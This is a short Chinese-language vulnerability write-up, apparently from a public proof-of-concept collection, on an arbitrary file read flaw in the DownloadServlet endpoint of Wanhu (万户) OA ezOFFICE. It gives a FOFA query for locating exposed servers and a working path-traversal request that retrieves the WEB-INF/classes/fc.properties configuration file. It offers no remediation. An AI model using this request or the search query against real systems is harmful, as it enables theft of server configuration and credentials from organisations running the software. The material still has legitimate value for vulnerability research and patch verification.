# 万户OA DownloadServlet 任意文件读取漏洞

## 漏洞描述

万户OA DownloadServlet接口存在任意文件读取漏洞，攻击者通过漏洞可以读取服务器中的敏感文件，获取敏感信息

## 漏洞影响

```
万户OA
```

## FOFA

```
app="万户网络-ezOFFICE"
```

## 漏洞复现

产品页面

![1](./images/202209131050540.png)

验证POC

```
/defaultroot/DownloadServlet?modeType=0&key=x&path=..&FileName=WEB-INF/classes/fc.properties&name=x&encrypt=x&cd=&downloadAll=2 
```

![2](./images/202209131050803.png)